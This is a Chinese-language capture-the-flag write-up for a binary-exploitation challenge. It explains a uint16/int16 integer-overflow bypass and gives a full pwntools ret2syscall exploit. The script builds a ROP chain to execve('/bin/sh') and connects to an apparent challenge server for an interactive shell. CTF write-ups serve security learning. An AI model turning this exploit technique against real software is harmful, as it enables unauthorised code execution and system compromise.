# crop

本题的考点是：
- 整数溢出
- ret2syscall

首先需要输入一个数字c，让初始为114的b加上c不能小于514，最后a=b进行赋值，要求a<0

但是这里的b和c都是uint16，而a是int16，所以存在整数溢出的问题

如果我们输入的c是-115，那么b+=c之后b成为了-1，但是由于uint16是无符号数，被解析后是65535，所以一定是大于514的

这样第一关就过了，之后就是简单的ret2syscall。

```python
payload = 'some padding...'
payload += p64(pop_rax_ret) + p64(59)   # rax 59
payload += p64(pop_rdi_ret) + p64(next(elf.search(b"/bin/sh\x00")))   # rdi
payload += p64(pop_rsi_ret) + p64(0)   # rsi
payload += p64(pop_rdx_ret) + p64(0)   # rdx
payload += p64(syscall) # execve("/bin/sh\x00",NULL.NULL)
```

所以完整的exp如下：

```python
from pwn import *

context.arch = "amd64"
DEBUG = 0

elf = ELF("../file/crop")
io = process("../file/crop") if DEBUG else remote("101.34.90.86", 20002)


io.sendlineafter("114", "-115") # 让b成为-1，uint16下的-1是65535，大于514

pop_rax_ret = 0x000000000040130a
pop_rdi_ret = 0x0000000000401304
pop_rdx_ret = 0x0000000000401308
pop_rsi_ret = 0x0000000000401306
ret = 0x000000000040101a
syscall = 0x000000000040130c

payload = b"b"*0x80 # padding stack
payload += b"woodwood"  # padding rbp
payload += p64(pop_rax_ret) + p64(59)   # rax 59
payload += p64(pop_rdi_ret) + p64(next(elf.search(b"/bin/sh\x00")))   # rdi
payload += p64(pop_rsi_ret) + p64(0)   # rsi
payload += p64(pop_rdx_ret) + p64(0)   # rdx
payload += p64(syscall) # execve("/bin/sh\x00",NULL.NULL)

io.sendlineafter("ok?", payload)

io.interactive()
```